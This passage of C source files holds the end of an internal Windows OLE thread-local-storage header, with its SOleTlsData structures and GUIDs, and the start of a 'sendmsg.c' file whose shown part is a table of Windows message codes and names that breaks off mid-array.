    OLETLS_PENDINGUNINIT        = 0x8000, // This thread has pending uninit
    OLETLS_FIRSTMTAINIT         = 0x10000,// First thread to attempt an MTA init
    OLETLS_FIRSTNTAINIT         = 0x20000,// First thread to attempt an NTA init
    OLETLS_APTINITIALIZING      = 0x40000 // Apartment Object is initializing
}  OLETLSFLAGS;


//+---------------------------------------------------------------------------
//
//  Structure:  SOleTlsData
//
//  Synopsis:   structure holding per thread state needed by OLE32
//
//+---------------------------------------------------------------------------
typedef struct tagSOleTlsData
{
#if !defined(_CHICAGO_)
    // Docfile multiple allocator support
    void               *pvThreadBase;       // per thread base pointer
    void               *pSmAllocator;       // per thread docfile allocator, CSmAllocator
#endif
    DWORD               dwApartmentID;      // Per thread "process ID"
    DWORD               dwFlags;            // see OLETLSFLAGS above

    LONG                TlsMapIndex;        // index in the global TLSMap
    void              **ppTlsSlot;          // Back pointer to the thread tls slot
    DWORD               cComInits;          // number of per-thread inits
    DWORD               cOleInits;          // number of per-thread OLE inits

    DWORD               cCalls;             // number of outstanding calls
    void               *pCallInfo;          // channel call info, CMessageCall
    void               *pFreeAsyncCall;     // ptr to available call object for this thread, CAsyncCall
    void               *pFreeClientCall;    // ptr to available call object for this thread, CClientCall

    void               *pObjServer;         // Activation Server Object for this apartment, CObjServer
    DWORD               dwTIDCaller;        // TID of current calling app
    void     *pCurrentCtx;        // Current context, CObjectContext
    void     *pEmptyCtx;          // Empty context, CObjectContext

    void     *pNativeCtx;         // Native context, CObjectContext
    void      *pNativeApt;         // Native apartment for the thread, CComApartment
    void           *pCallContext;       // call context object, IUnknown
    void           *pCtxCall;           // Context call object, CCtxCall

    void         *pPS;                // Policy set, CPolicySet
    PVOID               pvPendingCallsFront;// Per Apt pending async calls
    PVOID               pvPendingCallsBack;
    void       *pCallCtrl;          // call control for RPC for this apartment, CAptCallCtrl

    void      *pTopSCS;            // top server-side callctrl state, CSrvCallState
    void     *pMsgFilter;         // temp storage for App MsgFilter, IMessageFilter
    HWND                hwndSTA;            // STA server window same as poxid->hServerSTA
                                            // ...needed on Win95 before oxid registration
    LONG                cORPCNestingLevel;  // call nesting level (DBG only)

    DWORD               cDebugData;         // count of bytes of debug data in call
    ULONG               cPreRegOidsAvail;   // count of server-side OIDs avail
    unsigned hyper     *pPreRegOids;        // ptr to array of pre-reg OIDs

    UUID                LogicalThreadId;    // current logical thread id

    HANDLE              hThread;            // Thread handle used for cancel
    HANDLE              hRevert;            // Token before first impersonate.
    void           *pAsyncRelease;      // Controlling unknown for async release, IUnknown
    // DDE data
    HWND                hwndDdeServer;      // Per thread Common DDE server

    HWND                hwndDdeClient;      // Per thread Common DDE client
    ULONG               cServeDdeObjects;   // non-zero if objects DDE should serve
    // ClassCache data
    LPVOID              pSTALSvrsFront;     // Chain of LServers registers in this thread if STA
    // upper layer data
    HWND                hwndClip;           // Clipboard window

    void         *pDataObjClip;      // Current Clipboard DataObject, IDataObject
    DWORD               dwClipSeqNum;       // Clipboard Sequence # for the above DataObject
    DWORD               fIsClipWrapper;     // Did we hand out the wrapper Clipboard DataObject?
    void            *punkState;         // Per thread "state" object, IUnknown
    // cancel data
    DWORD              cCallCancellation;   // count of CoEnableCallCancellation
    // async sends data
    DWORD              cAsyncSends;         // count of async sends outstanding

    void*           pAsyncCallList;   // async calls outstanding, CAsyncCall
    void *pSurrogateList;  // Objects in the surrogate, CSurrogatedObjectList

    LockEntry             lockEntry;        // Locks currently held by the thread
    CallEntry             CallEntry;        // client-side call chain for this thread

#ifdef WX86OLE
    void           *punkStateWx86;      // Per thread "state" object for Wx86, IUnknown
#endif
    void               *pDragCursors;       // Per thread drag cursor table.

#ifdef _CHICAGO_
    LPVOID              pWcstokContext;     // Scan context for wcstok
#endif

    void           *punkError;          // Per thread error object, IUnknown
    ULONG               cbErrorData;        // Maximum size of error data.

#if(_WIN32_WINNT >= 0x0500)
    void           *punkActiveXSafetyProvider; // IUnknown
#endif //(_WIN32_WINNT >= 0x0500)

#if DBG==1
    LONG                cTraceNestingLevel; // call nesting level for OLETRACE
#endif

} SOleTlsData;

//+---------------------------------------------------------------------------
//
//  Structure:  SOleTlsData
//
//  Synopsis:   structure holding per thread state needed by OLE32
//
//+---------------------------------------------------------------------------
typedef struct tagSOleTlsData2
{
    // jsimmons 5/23/2001
    // Alert Alert:  nefarious folks (eg, URT) are looking in our TLS at
    // various stuff.   They expect that pCurrentCtx will be at a certain
    // offset from the beginning of the tls struct. So don't add, delete, or 
    // move any members within this block.

/////////////////////////////////////////////////////////////////////////////////////////
// ********* BEGIN "NO MUCKING AROUND" BLOCK ********* 
/////////////////////////////////////////////////////////////////////////////////////////
    // Docfile multiple allocator support
    void               *pvThreadBase;       // per thread base pointer
    void       *pSmAllocator;       // per thread docfile allocator

    DWORD               dwApartmentID;      // Per thread "process ID"
    DWORD               dwFlags;            // see OLETLSFLAGS above

    LONG                TlsMapIndex;        // index in the global TLSMap
    void              **ppTlsSlot;          // Back pointer to the thread tls slot
    DWORD               cComInits;          // number of per-thread inits
    DWORD               cOleInits;          // number of per-thread OLE inits

    DWORD               cCalls;             // number of outstanding calls
    void       *pCallInfo;          // channel call info
    void         *pFreeAsyncCall;     // ptr to available call object for this thread.
    void        *pFreeClientCall;    // ptr to available call object for this thread.

    void         *pObjServer;         // Activation Server Object for this apartment.
    DWORD               dwTIDCaller;        // TID of current calling app
    void     *pCurrentCtx;        // Current context
/////////////////////////////////////////////////////////////////////////////////////////
//  ********* END "NO MUCKING AROUND" BLOCK ********* 
/////////////////////////////////////////////////////////////////////////////////////////

    void     *pEmptyCtx;          // Empty context

    void     *pNativeCtx;         // Native context
    ULONGLONG           ContextId;          // Uniquely identifies the current context
    void      *pNativeApt;         // Native apartment for the thread.
    void           *pCallContext;       // call context object
    void           *pCtxCall;           // Context call object

    void         *pPS;                // Policy set
    PVOID               pvPendingCallsFront;// Per Apt pending async calls
    PVOID               pvPendingCallsBack;
    void       *pCallCtrl;          // call control for RPC for this apartment

    void      *pTopSCS;            // top server-side callctrl state
    void     *pMsgFilter;         // temp storage for App MsgFilter
    HWND                hwndSTA;            // STA server window same as poxid->hServerSTA
                                            // ...needed on Win95 before oxid registration
    LONG                cORPCNestingLevel;  // call nesting level (DBG only)

    DWORD               cDebugData;         // count of bytes of debug data in call

    UUID                LogicalThreadId;    // current logical thread id

    HANDLE              hThread;            // Thread handle used for cancel
    HANDLE              hRevert;            // Token before first impersonate.
    void           *pAsyncRelease;      // Controlling unknown for async release
    // DDE data
    HWND                hwndDdeServer;      // Per thread Common DDE server

    HWND                hwndDdeClient;      // Per thread Common DDE client
    ULONG               cServeDdeObjects;   // non-zero if objects DDE should serve
    // ClassCache data
    LPVOID              pSTALSvrsFront;     // Chain of LServers registers in this thread if STA
    // upper layer data
    HWND                hwndClip;           // Clipboard window

    void         *pDataObjClip;      // Current Clipboard DataObject
    DWORD               dwClipSeqNum;       // Clipboard Sequence # for the above DataObject
    DWORD               fIsClipWrapper;     // Did we hand out the wrapper Clipboard DataObject?
    void            *punkState;         // Per thread "state" object
    // cancel data
    DWORD              cCallCancellation;   // count of CoEnableCallCancellation
    // async sends data
    DWORD              cAsyncSends;         // count of async sends outstanding

    void*           pAsyncCallList;   // async calls outstanding
    void *pSurrogateList;  // Objects in the surrogate

    LockEntry             lockEntry;        // Locks currently held by the thread
    CallEntry             CallEntry;        // client-side call chain for this thread

#ifdef WX86OLE
    void           *punkStateWx86;      // Per thread "state" object for Wx86
#endif
    void               *pDragCursors;       // Per thread drag cursor table.

    void           *punkError;          // Per thread error object.
    ULONG               cbErrorData;        // Maximum size of error data.

    void           *punkActiveXSafetyProvider;

#if DBG==1
    LONG                cTraceNestingLevel; // call nesting level for OLETRACE
#endif

    void* pContextStack;

} SOleTlsData2;

#ifdef INITGUID
#include "initguid.h"
#endif

#define DEFINE_OLEGUID(name, l, w1, w2) \
    DEFINE_GUID(name, l, w1, w2, 0xC0,0,0,0,0,0,0,0x46)

DEFINE_OLEGUID(IID_IStdIdentity,        0x0000001bL, 0, 0);
DEFINE_OLEGUID(IID_IStdWrapper,         0x000001caL, 0, 0);

#endif // _OLETLS_H_

```

`tpp/sendmsg.c`:

```c

#define UNICODE
#include <windows.h>
#include <commctrl.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

typedef struct {
    unsigned int code;
    wchar_t* text;
} XMSGITEM;

XMSGITEM xmsglist[] =
{
    { 0, L"WM_NULL"},
    { 1, L"WM_CREATE" },
   // { 2, L"WM_DESTROY" },
    { 3, L"WM_MOVE" },
    { 5, L"WM_SIZE" },
    { 6, L"WM_ACTIVATE" },
    { 7, L"WM_SETFOCUS" },
    { 8, L"WM_KILLFOCUS" },
    { 10, L"WM_ENABLE" },
    { 11, L"WM_SETREDRAW" },
    { 12, L"WM_SETTEXT" },
    { 13, L"WM_GETTEXT" },
    { 14, L"WM_GETTEXTLENGTH" },
    { 15, L"WM_PAINT" },
    //{ 16, L"WM_CLOSE" },
    { 17, L"WM_QUERYENDSESSION" },
    //{ 18, L"WM_QUIT" },
    { 19, L"WM_QUERYOPEN" },
    { 20, L"WM_ERASEBKGND" },
    { 21, L"WM_SYSCOLORCHANGE" },
    { 22, L"WM_ENDSESSION" },
    { 24, L"WM_SHOWWINDOW" },
    { 25, L"WM_CTLCOLOR" },
    { 26, L"WM_WININICHANGE" },
    { 27, L"WM_DEVMODECHANGE" },
    { 28, L"WM_ACTIVATEAPP" },
    { 29, L"WM_FONTCHANGE" },
    { 30, L"WM_TIMECHANGE" },
    { 31, L"WM_CANCELMODE" },
    { 32, L"WM_SETCURSOR" },
    { 33, L"WM_MOUSEACTIVATE" },
    { 34, L"WM_CHILDACTIVATE" },
    { 35, L"WM_QUEUESYNC" },
    { 36, L"WM_GETMINMAXINFO" },
    { 38, L"WM_PAINTICON" },
    { 39, L"WM_ICONERASEBKGND" },
    { 40, L"WM_NEXTDLGCTL" },
    { 42, L"WM_SPOOLERSTATUS" },
    { 43, L"WM_DRAWITEM" },
    { 44, L"WM_MEASUREITEM" },
    { 45, L"WM_DELETEITEM" },
    { 46, L"WM_VKEYTOITEM" },
    { 47, L"WM_CHARTOITEM" },
    { 48, L"WM_SETFONT" },
    { 49, L"WM_GETFONT" },
    { 50, L"WM_SETHOTKEY" },
    { 51, L"WM_GETHOTKEY" },
    { 55, L"WM_QUERYDRAGICON" },
    { 57, L"WM_COMPAREITEM" },
    { 61, L"WM_GETOBJECT" },
    { 65, L"WM_COMPACTING" },
    { 68, L"WM_COMMNOTIFY" },
    { 70, L"WM_WINDOWPOSCHANGING" },
    { 71, L"WM_WINDOWPOSCHANGED" },
    { 72, L"WM_POWER" },
    { 73, L"WM_COPYGLOBALDATA" },
    { 74, L"WM_COPYDATA" },
    { 75, L"WM_CANCELJOURNAL" },
    { 78, L"WM_NOTIFY" },
    { 80, L"WM_INPUTLANGCHANGEREQUEST" },
    { 81, L"WM_INPUTLANGCHANGE" },
    { 82, L"WM_TCARD" },
    { 83, L"WM_HELP" },
    { 84, L"WM_USERCHANGED" },
    { 85, L"WM_NOTIFYFORMAT" },
    { 123, L"WM_CONTEXTMENU" },
    { 124, L"WM_STYLECHANGING" },
    { 125, L"WM_STYLECHANGED" },
    { 126, L"WM_DISPLAYCHANGE" },
    { 127, L"WM_GETICON" },
    { 128, L"WM_SETICON" },
    { 129, L"WM_NCCREATE" },
    { 130, L"WM_NCDESTROY" },
    { 131, L"WM_NCCALCSIZE" },
    { 132, L"WM_NCHITTEST" },
    { 133, L"WM_NCPAINT" },
    { 134, L"WM_NCACTIVATE" },
    { 135, L"WM_GETDLGCODE" },
    { 136, L"WM_SYNCPAINT" },
    { 160, L"WM_NCMOUSEMOVE" },
    { 161, L"WM_NCLBUTTONDOWN" },
    { 162, L"WM_NCLBUTTONUP" },
    { 163, L"WM_NCLBUTTONDBLCLK" },
    { 164, L"WM_NCRBUTTONDOWN" },
    { 165, L"WM_NCRBUTTONUP" },
    { 166, L"WM_NCRBUTTONDBLCLK" },
    { 167, L"WM_NCMBUTTONDOWN" },
    { 168, L"WM_NCMBUTTONUP" },
    { 169, L"WM_NCMBUTTONDBLCLK" },
    { 171, L"WM_NCXBUTTONDOWN" },
    { 172, L"WM_NCXBUTTONUP" },
    { 173, L"WM_NCXBUTTONDBLCLK" },
    { 176, L"EM_GETSEL" },
    { 177, L"EM_SETSEL" },
    { 178, L"EM_GETRECT" },
    { 179, L"EM_SETRECT" },
    { 180, L"EM_SETRECTNP" },
    { 181, L"EM_SCROLL" },
    { 182, L"EM_LINESCROLL" },
    { 183, L"EM_SCROLLCARET" },
    { 185, L"EM_GETMODIFY" },
    { 187, L"EM_SETMODIFY" },
   // { 188, L"EM_GETLINECOUNT" },
   // { 189, L"EM_LINEINDEX" },
    { 190, L"EM_SETHANDLE" },
    { 191, L"EM_GETHANDLE" },
    { 192, L"EM_GETTHUMB" },
    { 193, L"EM_LINELENGTH" },
    { 194, L"EM_REPLACESEL" },
    { 195, L"EM_SETFONT" },
    { 196, L"EM_GETLINE" },
    { 197, L"EM_LIMITTEXT" },
    { 197, L"EM_SETLIMITTEXT" },
    { 198, L"EM_CANUNDO" },
    { 199, L"EM_UNDO" },
    { 200, L"EM_FMTLINES" },
    { 201, L"EM_LINEFROMCHAR" },
    { 202, L"EM_SETWORDBREAK" },
    { 203, L"EM_SETTABSTOPS" },
    { 204, L"EM_SETPASSWORDCHAR" },
    { 205, L"EM_EMPTYUNDOBUFFER" },
    { 206, L"EM_GETFIRSTVISIBLELINE" },
    { 207, L"EM_SETREADONLY" },
    { 209, L"EM_SETWORDBREAKPROC" },
    { 209, L"EM_GETWORDBREAKPROC" },
    { 210, L"EM_GETPASSWORDCHAR" },
    { 211, L"EM_SETMARGINS" },
    { 212, L"EM_GETMARGINS" },
    { 213, L"EM_GETLIMITTEXT" },
    { 214, L"EM_POSFROMCHAR" },
    { 215, L"EM_CHARFROMPOS" },
    { 216, L"EM_SETIMESTATUS" },
    { 217, L"EM_GETIMESTATUS" },
    { 224, L"SBM_SETPOS" },
    { 225, L"SBM_GETPOS" },
    { 226, L"SBM_SETRANGE" },
    { 227, L"SBM_GETRANGE" },
    { 228, L"SBM_ENABLE_ARROWS" },
    { 230, L"SBM_SETRANGEREDRAW" },
    { 233, L"SBM_SETSCROLLINFO" },
    { 234, L"SBM_GETSCROLLINFO" },
    { 235, L"SBM_GETSCROLLBARINFO" },
    { 240, L"BM_GETCHECK" },
    { 241, L"BM_SETCHECK" },
    { 242, L"BM_GETSTATE" },
    { 243, L"BM_SETSTATE" },
    { 244, L"BM_SETSTYLE" },
    { 245, L"BM_CLICK" },
    { 246, L"BM_GETIMAGE" },
    { 247, L"BM_SETIMAGE" },
    { 248, L"BM_SETDONTCLICK" },
    { 255, L"WM_INPUT" },
    { 256, L"WM_KEYDOWN" },
    { 256, L"WM_KEYFIRST" },
    { 257, L"WM_KEYUP" },
    { 258, L"WM_CHAR" },
    { 259, L"WM_DEADCHAR" },
    { 260, L"WM_SYSKEYDOWN" },
    { 261, L"WM_SYSKEYUP" },
    { 262, L"WM_SYSCHAR" },
    { 263, L"WM_SYSDEADCHAR" },
    { 264, L"WM_KEYLAST" },
    { 265, L"WM_UNICHAR" },
    { 265, L"WM_WNT_CONVERTREQUESTEX" },
    { 266, L"WM_CONVERTREQUEST" },
    { 267, L"WM_CONVERTRESULT" },
    { 268, L"WM_INTERIM" },
    { 269, L"WM_IME_STARTCOMPOSITION" },
    { 270, L"WM_IME_ENDCOMPOSITION" },
    { 271, L"WM_IME_COMPOSITION" },
    { 271, L"WM_IME_KEYLAST" },
    { 272, L"WM_INITDIALOG" },
    { 273, L"WM_COMMAND" },
    { 274, L"WM_SYSCOMMAND" },
    { 275, L"WM_TIMER" },
    { 276, L"WM_HSCROLL" },
    { 277, L"WM_VSCROLL" },
    { 278, L"WM_INITMENU" },
    { 279, L"WM_INITMENUPOPUP" },
    { 280, L"WM_SYSTIMER" },
    { 287, L"WM_MENUSELECT" },
    { 288, L"WM_MENUCHAR" },
    { 289, L"WM_ENTERIDLE" },
    { 290, L"WM_MENURBUTTONUP" },
    { 291, L"WM_MENUDRAG" },
    { 292, L"WM_MENUGETOBJECT" },
    { 293, L"WM_UNINITMENUPOPUP" },
    { 294, L"WM_MENUCOMMAND" },
    { 295, L"WM_CHANGEUISTATE" },
    { 296, L"WM_UPDATEUISTATE" },
    { 297, L"WM_QUERYUISTATE" },
    { 306, L"WM_CTLCOLORMSGBOX" },
    { 307, L"WM_CTLCOLOREDIT" },
    { 308, L"WM_CTLCOLORLISTBOX" },
    { 309, L"WM_CTLCOLORBTN" },
    { 310, L"WM_CTLCOLORDLG" },
    { 311, L"WM_CTLCOLORSCROLLBAR" },
    { 312, L"WM_CTLCOLORSTATIC" },
    { 512, L"WM_MOUSEFIRST" },
    { 512, L"WM_MOUSEMOVE" },
    { 513, L"WM_LBUTTONDOWN" },
    { 514, L"WM_LBUTTONUP" },
    { 515, L"WM_LBUTTONDBLCLK" },
    { 516, L"WM_RBUTTONDOWN" },
    { 517, L"WM_RBUTTONUP" },
    { 518, L"WM_RBUTTONDBLCLK" },
    { 519, L"WM_MBUTTONDOWN" },
    { 520, L"WM_MBUTTONUP" },
    { 521, L"WM_MBUTTONDBLCLK" },
    { 521, L"WM_MOUSELAST" },
    { 522, L"WM_MOUSEWHEEL" },
    { 523, L"WM_XBUTTONDOWN" },
    { 524, L"WM_XBUTTONUP" },
    { 525, L"WM_XBUTTONDBLCLK" },
    { 528, L"WM_PARENTNOTIFY" },
    { 529, L"WM_ENTERMENULOOP" },
    { 530, L"WM_EXITMENULOOP" },
    { 531, L"WM_NEXTMENU" },
    { 532, L"WM_SIZING" },
    { 533, L"WM_CAPTURECHANGED" },
    { 534, L"WM_MOVING" },
    { 536, L"WM_POWERBROADCAST" },
    { 537, L"WM_DEVICECHANGE" },
    { 544, L"WM_MDICREATE" },
    { 545, L"WM_MDIDESTROY" },
    { 546, L"WM_MDIACTIVATE" },
    { 547, L"WM_MDIRESTORE" },
    { 548, L"WM_MDINEXT" },
    { 549, L"WM_MDIMAXIMIZE" },
    { 550, L"WM_MDITILE" },
    { 551, L"WM_MDICASCADE" },
    { 552, L"WM_MDIICONARRANGE" },
    { 553, L"WM_MDIGETACTIVE" },
    { 560, L"WM_MDISETMENU" },
    { 561, L"WM_ENTERSIZEMOVE" },
    { 562, L"WM_EXITSIZEMOVE" },
    { 563, L"WM_DROPFILES" },
    { 564, L"WM_MDIREFRESHMENU" },
    { 640, L"WM_IME_REPORT" },
    { 641, L"WM_IME_SETCONTEXT" },
    { 642, L"WM_IME_NOTIFY" },
    { 643, L"WM_IME_CONTROL" },
    { 644, L"WM_IME_COMPOSITIONFULL" },
    { 645, L"WM_IME_SELECT" },
    { 646, L"WM_IME_CHAR" },
    { 648, L"WM_IME_REQUEST" },
    { 656, L"WM_IMEKEYDOWN" },
    { 656, L"WM_IME_KEYDOWN" },
    { 657, L"WM_IMEKEYUP" },
    { 657, L"WM_IME_KEYUP" },
    { 672, L"WM_NCMOUSEHOVER" },
    { 673, L"WM_MOUSEHOVER" },
    { 674, L"WM_NCMOUSELEAVE" },
    { 675, L"WM_MOUSELEAVE" },
    { 768, L"WM_CUT" },
    { 769, L"WM_COPY" },
    { 770, L"WM_PASTE" },
    { 771, L"WM_CLEAR" },
    { 772, L"WM_UNDO" },
    { 773, L"WM_RENDERFORMAT" },
    { 774, L"WM_RENDERALLFORMATS" },
    { 775, L"WM_DESTROYCLIPBOARD" },
    { 776, L"WM_DRAWCLIPBOARD" },
    { 777, L"WM_PAINTCLIPBOARD" },
    { 778, L"WM_VSCROLLCLIPBOARD" },
    { 779, L"WM_SIZECLIPBOARD" },
    { 780, L"WM_ASKCBFORMATNAME" },
    { 781, L"WM_CHANGECBCHAIN" },
    { 782, L"WM_HSCROLLCLIPBOARD" },
    { 783, L"WM_QUERYNEWPALETTE" },
    { 784, L"WM_PALETTEISCHANGING" },
    { 785, L"WM_PALETTECHANGED" },
    { 786, L"WM_HOTKEY" },
    { 791, L"WM_PRINT" },
    { 792, L"WM_PRINTCLIENT" },
    { 793, L"WM_APPCOMMAND" },
    { 856, L"WM_HANDHELDFIRST" },
    { 863, L"WM_HANDHELDLAST" },
    { 864, L"WM_AFXFIRST" },
    { 895, L"WM_AFXLAST" },
    { 896, L"WM_PENWINFIRST" },
    { 897, L"WM_RCRESULT" },
    { 898, L"WM_HOOKRCRESULT" },
    { 899, L"WM_GLOBALRCCHANGE" },
    { 899, L"WM_PENMISCINFO" },
    { 900, L"WM_SKB" },
    { 901, L"WM_HEDITCTL" },
    { 901, L"WM_PENCTL" },
    { 902, L"WM_PENMISC" },
    { 903, L"WM_CTLINIT" },
    { 904, L"WM_PENEVENT" },
    { 911, L"WM_PENWINLAST" },
    { 1024, L"WM_USER" }
};

/**
static const char * const MessageTypeNames[SPY_MAX_MSGNUM + 1] =
{
    "WM_NULL",                  // 0x00 
    "WM_CREATE",
    "WM_DESTROY",
    "WM_MOVE",
    "wm_sizewait",
    "WM_SIZE",
    "WM_ACTIVATE",
    "WM_SETFOCUS",
    "WM_KILLFOCUS",
    "WM_SETVISIBLE",
    "WM_ENABLE",
    "WM_SETREDRAW",
    "WM_SETTEXT",
    "WM_GETTEXT",
    "WM_GETTEXTLENGTH",
    "WM_PAINT",
    "WM_CLOSE",                 // 0x10 
    "WM_QUERYENDSESSION",
    "WM_QUIT",
    "WM_QUERYOPEN",
    "WM_ERASEBKGND",
    "WM_SYSCOLORCHANGE",
    "WM_ENDSESSION",
    "wm_systemerror",
    "WM_SHOWWINDOW",
    "WM_CTLCOLOR",
    "WM_WININICHANGE",
    "WM_DEVMODECHANGE",
    "WM_ACTIVATEAPP",
    "WM_FONTCHANGE",
    "WM_TIMECHANGE",
    "WM_CANCELMODE",
    "WM_SETCURSOR",             // 0x20 
    "WM_MOUSEACTIVATE",
    "WM_CHILDACTIVATE",
    "WM_QUEUESYNC",
    "WM_GETMINMAXINFO",
    "wm_unused3",
    "wm_painticon",
    "WM_ICONERASEBKGND",
    "WM_NEXTDLGCTL",
    "wm_alttabactive",
    "WM_SPOOLERSTATUS",
    "WM_DRAWITEM",
    "WM_MEASUREITEM",
    "WM_DELETEITEM",
    "WM_VKEYTOITEM",
    "WM_CHARTOITEM",
    "WM_SETFONT",               // 0x30 
    "WM_GETFONT",
    "WM_SETHOTKEY",
    "WM_GETHOTKEY",
    "wm_filesyschange",
    "wm_isactiveicon",
    "wm_queryparkicon",
    "WM_QUERYDRAGICON",
    "wm_querysavestate",
    "WM_COMPAREITEM",
    "wm_testing",
    NULL,
    NULL,
    "WM_GETOBJECT",             // 0x3d 
    "wm_activateshellwindow",
    NULL,

    NULL,                       // 0x40 
    "wm_compacting", NULL, NULL,
    "WM_COMMNOTIFY", NULL,
    "WM_WINDOWPOSCHANGING",     // 0x0046 
    "WM_WINDOWPOSCHANGED",      // 0x0047 
    "WM_POWER", NULL,
    "WM_COPYDATA",
    "WM_CANCELJOURNAL", NULL, NULL,
    "WM_NOTIFY", NULL,

    // 0x0050 
    "WM_INPUTLANGCHANGEREQUEST",
    "WM_INPUTLANGCHANGE",
    "WM_TCARD",
    "WM_HELP",
    "WM_USERCHANGED",
    "WM_NOTIFYFORMAT", NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x0060 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x0070 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL,
    "WM_CONTEXTMENU",
    "WM_STYLECHANGING",
    "WM_STYLECHANGED",
    "WM_DISPLAYCHANGE",
    "WM_GETICON",

    "WM_SETICON",               // 0x0080 
    "WM_NCCREATE",              // 0x0081 
    "WM_NCDESTROY",             // 0x0082 
    "WM_NCCALCSIZE",            // 0x0083 
    "WM_NCHITTEST",             // 0x0084 
    "WM_NCPAINT",               // 0x0085 
    "WM_NCACTIVATE",            // 0x0086 
    "WM_GETDLGCODE",            // 0x0087 
    "WM_SYNCPAINT",
    "WM_SYNCTASK", NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x0090 
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x00A0 
    "WM_NCMOUSEMOVE",           // 0x00a0 
    "WM_NCLBUTTONDOWN",         // 0x00a1 
    "WM_NCLBUTTONUP",           // 0x00a2 
    "WM_NCLBUTTONDBLCLK",       // 0x00a3 
    "WM_NCRBUTTONDOWN",         // 0x00a4 
    "WM_NCRBUTTONUP",           // 0x00a5 
    "WM_NCRBUTTONDBLCLK",       // 0x00a6 
    "WM_NCMBUTTONDOWN",         // 0x00a7 
    "WM_NCMBUTTONUP",           // 0x00a8 
    "WM_NCMBUTTONDBLCLK",       // 0x00a9 
    NULL,                       // 0x00aa 
    "WM_NCXBUTTONDOWN",         // 0x00ab 
    "WM_NCXBUTTONUP",           // 0x00ac 
    "WM_NCXBUTTONDBLCLK",       // 0x00ad 
    NULL,                       // 0x00ae 
    NULL,                       // 0x00af 

    // 0x00B0 - Win32 Edit controls 
    "EM_GETSEL",                // 0x00b0 
    "EM_SETSEL",                // 0x00b1 
    "EM_GETRECT",               // 0x00b2 
    "EM_SETRECT",               // 0x00b3 
    "EM_SETRECTNP",             // 0x00b4 
    "EM_SCROLL",                // 0x00b5 
    "EM_LINESCROLL",            // 0x00b6 
    "EM_SCROLLCARET",           // 0x00b7 
    "EM_GETMODIFY",             // 0x00b8 
    "EM_SETMODIFY",             // 0x00b9 
    "EM_GETLINECOUNT",          // 0x00ba 
    "EM_LINEINDEX",             // 0x00bb 
    "EM_SETHANDLE",             // 0x00bc 
    "EM_GETHANDLE",             // 0x00bd 
    "EM_GETTHUMB",              // 0x00be 
    NULL,                       // 0x00bf 

    NULL,                       // 0x00c0 
    "EM_LINELENGTH",            // 0x00c1 
    "EM_REPLACESEL",            // 0x00c2 
    NULL,                       // 0x00c3 
    "EM_GETLINE",               // 0x00c4 
    "EM_LIMITTEXT",             // 0x00c5 
    "EM_CANUNDO",               // 0x00c6 
    "EM_UNDO",                  // 0x00c7 
    "EM_FMTLINES",              // 0x00c8 
    "EM_LINEFROMCHAR",          // 0x00c9 
    NULL,                       // 0x00ca 
    "EM_SETTABSTOPS",           // 0x00cb 
    "EM_SETPASSWORDCHAR",       // 0x00cc 
    "EM_EMPTYUNDOBUFFER",       // 0x00cd 
    "EM_GETFIRSTVISIBLELINE",   // 0x00ce 
    "EM_SETREADONLY",           // 0x00cf 

    "EM_SETWORDBREAKPROC",      // 0x00d0 
    "EM_GETWORDBREAKPROC",      // 0x00d1 
    "EM_GETPASSWORDCHAR",       // 0x00d2 
    "EM_SETMARGINS",            // 0x00d3 
    "EM_GETMARGINS",            // 0x00d4 
    "EM_GETLIMITTEXT",          // 0x00d5 
    "EM_POSFROMCHAR",           // 0x00d6 
    "EM_CHARFROMPOS",           // 0x00d7 
    "EM_SETIMESTATUS",          // 0x00d8 
    "EM_GETIMESTATUS",          // 0x00d9 
    NULL, NULL, NULL, NULL, NULL, NULL,

    // 0x00E0 - Win32 Scrollbars 
    "SBM_SETPOS",               // 0x00e0 
    "SBM_GETPOS",               // 0x00e1 
    "SBM_SETRANGE",             // 0x00e2 
    "SBM_GETRANGE",             // 0x00e3 
    "SBM_ENABLE_ARROWS",        // 0x00e4 
    NULL,
    "SBM_SETRANGEREDRAW",       // 0x00e6 
    NULL, NULL,
    "SBM_SETSCROLLINFO",        // 0x00e9 
    "SBM_GETSCROLLINFO",        // 0x00ea 
    NULL, NULL, NULL, NULL, NULL,

    // 0x00F0 - Win32 Buttons 
    "BM_GETCHECK",              // 0x00f0 
    "BM_SETCHECK",              // 0x00f1 
    "BM_GETSTATE",              // 0x00f2 
    "BM_SETSTATE",              // 0x00f3 
    "BM_SETSTYLE",              // 0x00f4 
    "BM_CLICK",                 // 0x00f5 
    "BM_GETIMAGE",              // 0x00f6 
    "BM_SETIMAGE",              // 0x00f7 
    NULL, NULL, NULL, NULL, NULL, NULL,
    "WM_INPUT_DEVICE_CHANGE",   // 0x00fe 
    "WM_INPUT",                 // 0x00ff 

    "WM_KEYDOWN",               // 0x0100 
    "WM_KEYUP",                 // 0x0101 
    "WM_CHAR",                  // 0x0102 
    "WM_DEADCHAR",              // 0x0103 
    "WM_SYSKEYDOWN",            // 0x0104 
    "WM_SYSKEYUP",              // 0x0105 
    "WM_SYSCHAR",               // 0x0106 
    "WM_SYSDEADCHAR",           // 0x0107 
    NULL,
    "WM_UNICHAR",               // 0x0109 
    "WM_CONVERTREQUEST",        // 0x010a 
    "WM_CONVERTRESULT",         // 0x010b 
    "WM_INTERIM",               // 0x010c 
    "WM_IME_STARTCOMPOSITION",  // 0x010d 
    "WM_IME_ENDCOMPOSITION",    // 0x010e 
    "WM_IME_COMPOSITION",       // 0x010f 

    "WM_INITDIALOG",            // 0x0110 
    "WM_COMMAND",               // 0x0111 
    "WM_SYSCOMMAND",            // 0x0112 
    "WM_TIMER",                 // 0x0113 
    "WM_HSCROLL",               // 0x0114 
    "WM_VSCROLL",               // 0x0115 
    "WM_INITMENU",              // 0x0116 
    "WM_INITMENUPOPUP",         // 0x0117 
    "WM_SYSTIMER",              // 0x0118 
    NULL, NULL, NULL, NULL, NULL, NULL,
    "WM_MENUSELECT",            // 0x011f 

    "WM_MENUCHAR",              // 0x0120 
    "WM_ENTERIDLE",             // 0x0121 

    "WM_MENURBUTTONUP",         // 0x0122 
